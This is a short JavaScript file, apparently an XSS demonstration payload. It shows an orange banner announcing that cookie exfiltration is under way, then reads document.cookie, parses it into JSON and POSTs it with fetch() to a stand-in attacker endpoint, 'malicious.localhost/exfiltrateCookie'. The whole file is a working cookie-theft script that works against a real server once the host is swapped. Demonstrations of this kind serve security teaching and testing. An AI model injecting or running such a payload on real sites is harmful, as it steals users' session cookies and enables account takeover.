var notice = document.createElement('h2');
notice.textContent = 'Cookie exfiltration is happening on the backgroud. Check malicious server log.';
notice.style.color = 'orange';
notice.style.textAlign = 'center';
var body = document.body;
body.appendChild(notice);


var cookies = document.cookie;
cookies = cookies.split(";")

var cookieObject = {}
cookies.forEach(element => {
  let [key, value] = element.split("=");
  cookieObject[key.trim()] = value.trim();
  
});

var jsonData = JSON.stringify(cookieObject);

// Send the JSON data using fetch()
fetch("https://malicious.localhost/exfiltrateCookie", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json"
  },
  body: jsonData, 
})
  .then(response => {
  if (response.status === 204) {
  } else {
  }
  })
  .catch(error => {
    console.error('Error:', error);
  });